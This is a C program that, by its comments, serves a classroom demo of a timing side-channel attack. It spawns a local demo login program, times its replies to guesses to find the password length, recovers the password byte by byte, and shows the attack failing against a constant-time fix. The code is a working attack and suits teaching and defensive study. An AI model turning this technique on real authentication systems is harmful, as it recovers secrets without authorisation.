/*
 * attack.c — a timing side-channel attacker that treats the login program as a
 * BLACK BOX. It spawns the target (login / login_safe) as a child process and
 * talks to it only through a pipe: it sends a guess, reads "granted"/"denied",
 * and times the round-trip. It NEVER sees the secret — the secret lives in the
 * other program's memory. All it has is a stopwatch.
 *
 *   ./attack ./login              step through the attack by hand (manual — the DEFAULT)
 *   ./attack ./login auto  [len]  run the whole recovery automatically instead
 *   ./attack ./login manual [len] manual mode, stated explicitly (same as the default)
 *   ./attack ./login_safe         run the SAME attack against the fixed program
 *                                 — and watch it fail
 *
 * Manual mode is the default: it has an `auto` command, so it's the superset —
 * you can feel the timing by hand and then hand the rest to the automatic run.
 * `len` is optional — the attacker discovers the password length by timing. Give
 * a number to skip that probe. Ctrl-C stops the attack at any time.
 *
 * POSIX C — builds and runs on Linux (Kali) and macOS alike.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <time.h>
#include <signal.h>
#include <sys/wait.h>

/* ── tunables ───────────────────────────────────────────────────────────── */
#define SAMPLES    200      /* timing samples kept per candidate (min wins; higher = steadier) */
#define TOP_N      8        /* candidates drawn in a sweep */
#define BAR_WIDTH  42
#define MAXLEN     256
#define DETECT_SAMPLES 24   /* lighter sampling for the length probe */
#define DETECT_MAXLEN  40   /* longest password the auto-probe will consider */
#define DETECT_BUDGET  8.0  /* seconds: give up probing after this and report "undetected" */

static const char CHARSET[] =
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_";

#define C_RESET  "\033[0m"
#define C_WIN    "\033[1;32m"
#define C_DIM    "\033[2m"
#define C_CYAN   "\033[36m"
#define C_YELLOW "\033[33m"

/* Set by Ctrl-C so an unbounded attack (or a long probe) stops when the user
 * decides to — not by killing the process. Long loops poll it between guesses. */
static volatile sig_atomic_t g_stop = 0;
static void on_sigint(int sig) { (void)sig; g_stop = 1; }

/* ── the pipe to the target co-process ──────────────────────────────────── */
static FILE  *to_target;     /* we write guesses here          */
static FILE  *from_target;   /* we read verdicts here          */
static pid_t  target_pid;

static void spawn_target(const char *path) {
    int in[2], out[2];                 /* in: attacker->target ; out: target->attacker */
    if (pipe(in) || pipe(out)) { perror("pipe"); exit(1); }
    target_pid = fork();
    if (target_pid < 0) { perror("fork"); exit(1); }
    if (target_pid == 0) {                       /* child = the target program */
        setpgid(0, 0);            /* own process group: Ctrl-C hits the attacker, not the target */
        dup2(in[0], STDIN_FILENO);
        dup2(out[1], STDOUT_FILENO);
        close(in[0]); close(in[1]); close(out[0]); close(out[1]);
        execl(path, path, (char *)NULL);
        perror("exec (is the path right? try ./login)");
        _exit(127);
    }
    close(in[0]); close(out[1]);
    to_target   = fdopen(in[1], "w");
    from_target = fdopen(out[0], "r");
    if (!to_target || !from_target) { perror("fdopen"); exit(1); }
}

static void reap_target(void) {
    if (to_target)   fclose(to_target);          /* EOF => target exits its loop */
    if (from_target) fclose(from_target);
    if (target_pid > 0) waitpid(target_pid, NULL, 0);
}

/* Send one guess, wait for the verdict line, return the elapsed nanoseconds.
 * *granted (if non-NULL) is set from the reply. UINT64_MAX means the target
 * died — a real error, not a timing. */
static uint64_t ask(const char *guess, int *granted) {
    struct timespec a, b;
    char resp[64];
    clock_gettime(CLOCK_MONOTONIC_RAW, &a);
    if (fprintf(to_target, "%s\n", guess) < 0 || fflush(to_target) != 0) {
        if (granted) *granted = 0;
        return UINT64_MAX;
    }
    if (!fgets(resp, sizeof resp, from_target)) {
        if (granted) *granted = 0;
        return UINT64_MAX;
    }
    clock_gettime(CLOCK_MONOTONIC_RAW, &b);
    if (granted) *granted = (strstr(resp, "granted") != NULL);
    return (uint64_t)(b.tv_sec - a.tv_sec) * 1000000000ull + (b.tv_nsec - a.tv_nsec);
}

/* Build a guess: the recovered prefix, `ch` at `pos`, filler to `len`. */
static void build_guess(char *out, const char *recovered, size_t pos, char ch, size_t len) {
    memcpy(out, recovered, pos);
    out[pos] = ch;
    for (size_t f = pos + 1; f < len; f++) out[f] = '.';
    out[len] = '\0';
}

/* Time one (pos,ch) guess `SAMPLES` times, return the MINIMUM — the run least
 * disturbed by scheduler/pipe noise, i.e. the truest length of the code path. */
static uint64_t min_time(const char *recovered, size_t pos, char ch, size_t len) {
    char guess[MAXLEN];
    build_guess(guess, recovered, pos, ch, len);
    uint64_t best = UINT64_MAX;
    for (int s = 0; s < SAMPLES; s++) {
        uint64_t t = ask(guess, NULL);
        if (t < best) best = t;
    }
    return best;
}

/* ── length discovery (no prior knowledge of the secret) ────────────────────
 * At the CORRECT length, sweeping position 0 makes exactly ONE character slow
 * (it matched one byte before the early return) while every other character
 * returns at the floor. At any WRONG length the check bails immediately
 * (n != secret_len) for every character, so the sweep is flat. A constant-time
 * target is flat at every length too.
 *
 * The tell is therefore a single lone outlier: the length whose slowest
 * character sits far above its SECOND-slowest. Ordinary jitter never manufactures
 * one clean outlier the way a real byte-match does, so this rejects both wrong
 * lengths and constant-time targets. Returns 1 and sets *out on success. */
static int detect_length(size_t *out, double budget_sec) {
    size_t nchars = strlen(CHARSET);
    uint64_t best_gap = 0, second_gap = 0; size_t best_len = 1;
    char guess[MAXLEN];
    struct timespec t0; clock_gettime(CLOCK_MONOTONIC, &t0);

    for (size_t L = 1; L <= DETECT_MAXLEN; L++) {
        fprintf(stderr, "\r   probing length %2zu/%d ...", L, DETECT_MAXLEN);
        fflush(stderr);

        uint64_t mn[128];
        for (size_t c = 0; c < nchars; c++) mn[c] = UINT64_MAX;
        for (int s = 0; s < DETECT_SAMPLES && !g_stop; s++) {
            for (size_t c = 0; c < nchars; c++) {
                guess[0] = CHARSET[c];
                for (size_t f = 1; f < L; f++) guess[f] = '.';
                guess[L] = '\0';
                uint64_t t = ask(guess, NULL);
                if (t < mn[c]) mn[c] = t;
            }
        }
        /* the two largest per-character minima at this length */
        uint64_t top1 = 0, top2 = 0;
        for (size_t c = 0; c < nchars; c++) {
            if (mn[c] >= top1)      { top2 = top1; top1 = mn[c]; }
            else if (mn[c] > top2)  { top2 = mn[c]; }
        }
        uint64_t gap = top1 - top2;                 /* how alone the outlier is */
        if (gap > best_gap)        { second_gap = best_gap; best_gap = gap; best_len = L; }
        else if (gap > second_gap) { second_gap = gap; }

        /* Stop early if the user interrupts, or the time budget is spent. The
         * budget only bites on a SLOW target — i.e. one whose every guess costs
         * full work, which is exactly the constant-time (non-leaking) case. A
         * leaky target's wrong-length guesses return instantly, so it finishes
         * the whole sweep in a fraction of a second and is never timed out. */
        struct timespec now; clock_gettime(CLOCK_MONOTONIC, &now);
        double elapsed = (now.tv_sec - t0.tv_sec) + (now.tv_nsec - t0.tv_nsec) / 1e9;
        if (g_stop || elapsed > budget_sec) break;
    }
    fprintf(stderr, "\r%40s\r", "");                /* clear the progress line */

    /* Accept only if one length's outlier gap clearly beats every other length's
     * (scale-free 4x test — rejects the uniformly-noisy constant-time case) and
     * clears a small absolute floor (rejects the no-amplifier / no-signal case). */
    if (best_gap > 3000 && best_gap >= 4 * (second_gap + 1)) { *out = best_len; return 1; }
    return 0;
}

/* Spoken explanation of the length-discovery trick — printed when it succeeds. */
static void explain_detection(size_t len) {
    printf(C_DIM
        "   How the length was found: for each candidate length L, the attacker sent\n"
        "   one guess per character (that character at position 0, filler after) and\n"
        "   timed it. At the TRUE length exactly one character runs slow — it matched\n"
        "   a byte before the vulnerable early-exit — while every WRONG length returns\n"
        "   instantly for every character (the `n != secret_len` check fails first).\n"
        "   Length %zu was the one length with that lone slow outlier.\n" C_RESET, len);
}

/* Nudge shown when a position's sweep shows no real outlier. Judged the same way
 * as length detection: a genuine match makes the slowest character stand clearly
 * apart from the pack; noise (constant-time target, or a wrong length where every
 * guess bails instantly) leaves the slowest lost among the rest. Baseline-relative
 * so it works whether the flat level is ~3 us or ~460 us. Takes the sorted sweep:
 * `top` (slowest), `second`, and `last` (fastest). */
static void flat_hint(uint64_t top, uint64_t second, uint64_t last) {
    uint64_t topgap     = top - second;      /* how alone the slowest is        */
    uint64_t packspread = second - last;     /* how spread the rest already are */
    int has_signal = (topgap > 4000) && (topgap > 2 * packspread);
    if (!has_signal)
        printf(C_YELLOW
            "   -> no outlier here — the timings are flat. Either the target is constant-time\n"
            "      (the fix working), or the length is wrong for a leaky target (try `detect` / `len N`).\n"
            C_RESET "\n");
}

/* ── visualization ──────────────────────────────────────────────────────── */
typedef struct { char ch; uint64_t t; } Cand;

static int cand_desc(const void *a, const void *b) {
    uint64_t ta = ((const Cand *)a)->t, tb = ((const Cand *)b)->t;
    return (tb > ta) - (tb < ta);
}

static void draw_bar(char ch, uint64_t t, uint64_t lo, uint64_t hi, int winner) {
    int n = (hi > lo) ? (int)((double)(t - lo) / (hi - lo) * BAR_WIDTH + 0.5) : 0;
    printf("   %s%c%s  ", winner ? C_WIN : C_DIM, ch, C_RESET);
    fputs(winner ? C_WIN : C_DIM, stdout);
    for (int i = 0; i < n; i++)             fputs("█", stdout);
    for (int i = n; i < BAR_WIDTH; i++)     putchar(' ');
    printf("%s  %6llu ns%s\n", winner ? C_WIN : C_DIM, (unsigned long long)t, C_RESET);
}

/* Sweep EVERY charset character at one position, interleaved (each round times
 * all candidates once, keep each one's minimum), and sort slowest-first. */
static void sweep(const char *recovered, size_t pos, size_t len, Cand *cand, size_t nchars) {
    char guess[MAXLEN];
    for (size_t c = 0; c < nchars; c++) { cand[c].ch = CHARSET[c]; cand[c].t = UINT64_MAX; }
    for (int s = 0; s < SAMPLES && !g_stop; s++) {
        for (size_t c = 0; c < nchars; c++) {
            build_guess(guess, recovered, pos, CHARSET[c], len);
            uint64_t t = ask(guess, NULL);
            if (t < cand[c].t) cand[c].t = t;
        }
    }
    qsort(cand, nchars, sizeof(Cand), cand_desc);
}

static void draw_sweep(Cand *cand, size_t pos, const char *recovered) {
    uint64_t hi = cand[0].t, lo = cand[TOP_N - 1].t;
    printf("\n" C_CYAN "position %zu" C_RESET "  (locked in so far: \"" C_WIN "%s" C_RESET "\")\n",
           pos, recovered);
    for (int i = 0; i < TOP_N; i++)
        draw_bar(cand[i].ch, cand[i].t, lo, hi, i == 0);
}

static void banner(const char *target, size_t len, size_t nchars, const char *mode) {
    printf(C_CYAN "\n╔══════════════════════════════════════════════════════════╗\n");
    printf(       "║        TIMING SIDE-CHANNEL ATTACK — live recovery        ║\n");
    printf(       "╚══════════════════════════════════════════════════════════╝" C_RESET "\n\n");
    printf("Target program : " C_YELLOW "%s" C_RESET "   (a black box — we only time its replies)\n", target);
    printf("Mode           : " C_YELLOW "%s" C_RESET "\n", mode);
    printf("The attacker never sees the secret. It only sends guesses and times them.\n\n");
    if (len > 0) {
        printf("   Brute force needs up to  " C_YELLOW "%zu^%zu" C_RESET "  guesses.\n", nchars, len);
        printf("   Timing attack needs only " C_YELLOW "%zu x %zu = %zu" C_RESET " guesses.\n",
               nchars, len, nchars * len);
    } else {
        printf("   " C_YELLOW "Password length unknown" C_RESET
               " — recovering position by position until you stop (Ctrl-C).\n");
    }
}

/* Draw the "staircase": run time vs number of matching leading bytes, using the
 * recovered password (all we, the attacker, know). This is the leak in one picture. */
static void staircase(const char *recovered, size_t len) {
    printf("\n" C_CYAN "The leak in one picture: run time grows with each matching byte\n" C_RESET);
    uint64_t stair[MAXLEN], lo = UINT64_MAX, hi = 0;
    for (size_t k = 0; k <= len; k++) {
        uint64_t t;
        if (k < len) {
            /* first k bytes correct, byte k deliberately wrong */
            char wrong = (recovered[k] == '#') ? '@' : '#';
            t = min_time(recovered, k, wrong, len);
        } else {
            /* all bytes correct: time the exact recovered password */
            char full[MAXLEN]; memcpy(full, recovered, len); full[len] = '\0';
            t = UINT64_MAX;
            for (int s = 0; s < SAMPLES; s++) { uint64_t x = ask(full, NULL); if (x < t) t = x; }
        }
        stair[k] = t;
        if (t < lo) lo = t;
        if (t > hi) hi = t;
    }
    for (size_t k = 0; k <= len; k++) {
        int n = (hi > lo) ? (int)((double)(stair[k] - lo) / (hi - lo) * BAR_WIDTH + 0.5) : 0;
        printf("   %zu bytes match  " C_YELLOW, k);
        for (int i = 0; i < n; i++) fputs("█", stdout);
        printf("%s  %6llu ns\n", C_RESET, (unsigned long long)stair[k]);
    }
}

static void verdict(const char *recovered, size_t len) {
    char full[MAXLEN]; memcpy(full, recovered, len); full[len] = '\0';
    int granted = 0;
    ask(full, &granted);
    printf("\n   Recovered guess: \"" C_WIN "%s" C_RESET "\"\n", recovered);
    if (granted)
        printf("   %s\n\n", C_WIN "✓ Access granted — recovered by timing alone, "
                                   "never reading the secret." C_RESET);
    else
        printf("   %s\n\n", C_YELLOW "✗ Access denied — the timing gave nothing away. "
                                      "(Expected against login_safe: the fix works.)" C_RESET);
}

/* ── auto mode ──────────────────────────────────────────────────────────── */
static int run_auto(const char *target, size_t len) {
    size_t nchars = strlen(CHARSET);
    banner(target, len, nchars, "auto");
    printf("For each position we show the %d slowest candidates. The " C_WIN "green" C_RESET
           " bar (slowest) is the pick.\n", TOP_N);

    char recovered[MAXLEN] = {0};
    Cand cand[128];
    /* Bounded when the length is known; otherwise run until the user stops it
     * (Ctrl-C) — we never invent a length or auto-terminate. */
    for (size_t pos = 0; (len == 0 || pos < len) && pos < MAXLEN - 1 && !g_stop; pos++) {
        sweep(recovered, pos, (len ? len : pos + 1), cand, nchars);
        if (g_stop) break;
        recovered[pos] = cand[0].ch;
        recovered[pos + 1] = '\0';
        draw_sweep(cand, pos, recovered);
    }

    if (len > 0 && !g_stop) {
        staircase(recovered, len);
        verdict(recovered, len);
    } else {
        printf("\n" C_YELLOW "Stopped." C_RESET " Recovered so far: \"" C_WIN "%s" C_RESET "\"\n"
               "(No known length to converge on — if this is the constant-time target, that's\n"
               " the fix working: the attack can't even find where the password ends.)\n\n",
               recovered);
    }
    return 0;
}

/* ── manual mode ────────────────────────────────────────────────────────── */
static void manual_help(void) {
    printf("\n" C_CYAN "Manual mode — commands:" C_RESET "\n"
        "   " C_YELLOW "<char>" C_RESET "     time one character at the current position (repeat to compare)\n"
        "   " C_YELLOW "scan" C_RESET "       sweep ALL characters at this position and rank them\n"
        "   " C_YELLOW "lock <c>" C_RESET "   fix character c here and move to the next position\n"
        "   " C_YELLOW "lock" C_RESET "       fix the slowest character you've tried here, and advance\n"
        "   " C_YELLOW "try <text>" C_RESET " time an arbitrary full guess (freeform experiment)\n"
        "   " C_YELLOW "submit" C_RESET "     send the recovered string as-is; see granted/denied\n"
        "   " C_YELLOW "detect" C_RESET "     (re)probe the password length by timing\n"
        "   " C_YELLOW "len <n>" C_RESET "    set the password length by hand (0 = unknown)\n"
        "   " C_YELLOW "auto" C_RESET "       hand the rest over to the automatic attack\n"
        "   " C_YELLOW "help" C_RESET "       reprint these commands\n"
        "   " C_YELLOW "quit" C_RESET "       exit (type the full word, or press Ctrl-D)\n\n"
        "(A single letter is always a candidate test — so you can safely try 'q'.\n"
        " On a leaky target you need the right length to see a signal: use `detect` or `len`.)\n\n");
}

/* redraw everything tried so far at this position, slowest first */
static void draw_tried(Cand *tried, size_t ntried, size_t pos, const char *recovered) {
    if (ntried == 0) return;
    Cand sorted[128];
    memcpy(sorted, tried, ntried * sizeof(Cand));
    qsort(sorted, ntried, sizeof(Cand), cand_desc);
    uint64_t hi = sorted[0].t, lo = sorted[ntried - 1].t;
    printf(C_CYAN "position %zu" C_RESET "  (locked in: \"" C_WIN "%s" C_RESET "\")  "
           "— slowest = most likely:\n", pos, recovered);
    for (size_t i = 0; i < ntried; i++)
        draw_bar(sorted[i].ch, sorted[i].t, lo, hi, i == 0);
    printf("\n");
}

static int run_manual(const char *target, size_t len) {
    size_t nchars = strlen(CHARSET);
    banner(target, len, nchars, "manual");
    manual_help();

    char  recovered[MAXLEN] = {0};
    size_t pos = 0;
    Cand  tried[128]; size_t ntried = 0;
    char  line[MAXLEN];

    /* Unbounded: the session ends only when the user says so (quit / Ctrl-D). */
    for (;;) {
        if (len) printf(C_CYAN "pos %zu/%zu" C_RESET, pos, len);
        else     printf(C_CYAN "pos %zu/?"   C_RESET, pos);
        printf(" [\"" C_WIN "%s" C_RESET "\"] > ", recovered);
        fflush(stdout);
        if (!fgets(line, sizeof line, stdin)) { printf("\n"); break; }   /* Ctrl-D */
        line[strcspn(line, "\n")] = '\0';
        g_stop = 0;                     /* fresh command: clear any earlier Ctrl-C */
        if (line[0] == '\0') continue;

        /* NB: only the full word "quit"/"exit" (or Ctrl-D) leaves — a bare "q" is a
         * valid candidate character to test, so it must NOT be a quit shortcut. */
        if (!strcmp(line, "quit") || !strcmp(line, "exit")) break;
        if (!strcmp(line, "help")) { manual_help(); continue; }

        size_t el = len ? len : pos + 1;            /* length used to build a probe */

        if (!strcmp(line, "detect")) {
            printf("Probing the length by timing (up to %.0f s; Ctrl-C to skip)...\n", DETECT_BUDGET);
            size_t d;
            if (detect_length(&d, DETECT_BUDGET)) {
                len = d; pos = 0; ntried = 0; recovered[0] = '\0';
                printf("   " C_WIN "detected length: %zu" C_RESET " — restarting at position 0.\n", len);
                explain_detection(len);
            } else {
                printf("   " C_YELLOW "undetected — no lone timing outlier at any length "
                       "(the target looks constant-time)." C_RESET "\n\n");
            }
            g_stop = 0;
            continue;
        }

        if (!strncmp(line, "len ", 4)) {
            int v = atoi(line + 4);
            if (v >= 0 && v < MAXLEN) {
                len = (size_t)v; pos = 0; ntried = 0; recovered[0] = '\0';
                if (len) printf("   length set to %zu — restarting at position 0.\n\n", len);
                else     printf("   length set to unknown.\n\n");
            } else printf("   ? length out of range (0..%d).\n\n", MAXLEN - 1);
            continue;
        }

        if (!strcmp(line, "submit")) {
            int granted = 0; uint64_t best = UINT64_MAX;
            for (int s = 0; s < SAMPLES && !g_stop; s++) {
                uint64_t t = ask(recovered, &granted); if (t < best) best = t;
            }
            g_stop = 0;
            printf("   \"%s\"  ->  %s\n\n", recovered,
                   granted ? C_WIN "GRANTED" C_RESET : C_YELLOW "denied" C_RESET);
            continue;
        }

        if (!strcmp(line, "auto")) {
            printf("\nHanding over to auto%s...\n", len ? "" : " (length unknown — Ctrl-C to stop)");
            Cand cand[128];
            for (; (len == 0 || pos < len) && pos < MAXLEN - 1 && !g_stop; pos++) {
                sweep(recovered, pos, (len ? len : pos + 1), cand, nchars);
                if (g_stop) break;
                recovered[pos] = cand[0].ch; recovered[pos + 1] = '\0';
                draw_sweep(cand, pos, recovered);
            }
            g_stop = 0;
            if (len && pos >= len) { staircase(recovered, len); verdict(recovered, len); }
            ntried = 0;
            continue;
        }

        if (!strcmp(line, "scan")) {
            Cand cand[128];
            sweep(recovered, pos, el, cand, nchars);
            g_stop = 0;
            draw_sweep(cand, pos, recovered);
            ntried = (nchars < 128) ? nchars : 128;
            memcpy(tried, cand, ntried * sizeof(Cand));
            flat_hint(cand[0].t, cand[1].t, cand[nchars - 1].t);
            continue;
        }

        if (!strncmp(line, "try ", 4)) {
            const char *g = line + 4;
            int granted = 0; uint64_t best = UINT64_MAX;
            for (int s = 0; s < SAMPLES && !g_stop; s++) { uint64_t t = ask(g, &granted); if (t < best) best = t; }
            g_stop = 0;
            printf("   \"%s\"  ->  %s   " C_DIM "(%llu ns)" C_RESET "\n\n",
                   g, granted ? C_WIN "granted" C_RESET : C_YELLOW "denied" C_RESET,
                   (unsigned long long)best);
            continue;
        }

        if (!strcmp(line, "lock") || !strncmp(line, "lock ", 5)) {
            char ch;
            if (line[4] == ' ' && line[5] != '\0') {
                ch = line[5];
            } else if (ntried > 0) {
                Cand s[128]; memcpy(s, tried, ntried * sizeof(Cand));
                qsort(s, ntried, sizeof(Cand), cand_desc);
                ch = s[0].ch;              /* slowest tried so far */
            } else {
                printf("   nothing tried yet — test a character or `scan` first.\n\n");
                continue;
            }
            if (pos >= MAXLEN - 1) { printf("   (maximum length reached)\n\n"); continue; }
            recovered[pos] = ch;
            recovered[pos + 1] = '\0';
            printf("   " C_WIN "locked '%c' at position %zu" C_RESET "  ->  \"" C_WIN "%s" C_RESET "\"\n\n",
                   ch, pos, recovered);
            pos++;
            ntried = 0;
            if (len && pos >= len) {
                printf("Reached the detected length — checking the full guess:\n");
                staircase(recovered, len);
                verdict(recovered, len);
                printf("(Keep going if you like, or `quit` when done.)\n\n");
            }
            continue;
        }

        /* a single character: time it at the current position and add to the list */
        if (line[1] == '\0') {
            char ch = line[0];
            uint64_t t = min_time(recovered, pos, ch, el);
            g_stop = 0;
            /* update if already tried, else append (capped so we never overrun) */
            size_t j;
            for (j = 0; j < ntried; j++) if (tried[j].ch == ch) break;
            if (j == ntried) { if (ntried < 128) ntried++; else j = 127; }
            tried[j].ch = ch; tried[j].t = t;
            printf("   '%c' -> %llu ns\n", ch, (unsigned long long)t);
            draw_tried(tried, ntried, pos, recovered);
            continue;
        }

        printf("   ? unrecognised. Type `help`.\n\n");
    }

    printf("\nStopped. Recovered so far: \"" C_WIN "%s" C_RESET "\"\n\n", recovered);
    return 0;
}

/* ── entry ──────────────────────────────────────────────────────────────── */
int main(int argc, char **argv) {
    signal(SIGPIPE, SIG_IGN);                 /* don't die if the target closes the pipe */
    struct sigaction sa;                      /* Ctrl-C = "stop when I decide", not kill */
    memset(&sa, 0, sizeof sa);
    sa.sa_handler = on_sigint;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_RESTART;                 /* restart interrupted reads; we poll g_stop */
    sigaction(SIGINT, &sa, NULL);

    if (argc < 2) {
        fprintf(stderr,
            "usage: %s <target-program> [auto|manual] [password-length]\n"
            "   e.g. %s ./login                 (manual — step through by hand; the DEFAULT)\n"
            "        %s ./login auto            (run the whole recovery automatically)\n"
            "        %s ./login_safe            (watch the fix defeat the attack)\n"
            "   The password length is discovered by timing. Give a number to skip\n"
            "   the probe (e.g. `%s ./login 12`). Ctrl-C stops the attack at any time.\n",
            argv[0], argv[0], argv[0], argv[0], argv[0]);
        return 2;
    }

    const char *target = argv[1];
    const char *mode   = "manual";  /* default: hand control to the operator (has an `auto` command) */
    size_t len = 0;                 /* 0 = auto-detect */
    for (int i = 2; i < argc; i++) {
        if      (!strcmp(argv[i], "manual")) mode = "manual";
        else if (!strcmp(argv[i], "auto"))   mode = "auto";
        else {
            int v = atoi(argv[i]);
            if (v > 0 && v < MAXLEN) len = (size_t)v;
        }
    }

    spawn_target(target);

    if (len == 0) {
        printf("\nProbing the target by timing to discover the password length "
               "(up to %.0f s; Ctrl-C to skip)...\n", DETECT_BUDGET);
        size_t detected;
        if (detect_length(&detected, DETECT_BUDGET)) {
            len = detected;
            printf("   " C_WIN "detected length: %zu" C_RESET
                   "  (change SECRET in login.c to any length — this adapts)\n", len);
            explain_detection(len);
        } else {
            /* Do NOT invent a length. Leave it unknown; the chosen mode will run
             * until the user stops it rather than terminating at a made-up length. */
            printf("   " C_YELLOW "length undetected — no lone timing outlier within %.0f s.\n"
                   "   Not assuming a length; the target may be constant-time (the fix working).\n"
                   "   The attack will run until you stop it (Ctrl-C), or set a length yourself."
                   C_RESET "\n", DETECT_BUDGET);
        }
        g_stop = 0;                 /* a Ctrl-C used to skip the probe shouldn't stop the attack */
    } else {
        printf("\nUsing password length " C_WIN "%zu" C_RESET " (from command line).\n", len);
    }

    int rc = strcmp(mode, "manual") == 0 ? run_manual(target, len)
                                         : run_auto(target, len);
    reap_target();
    return rc;
}
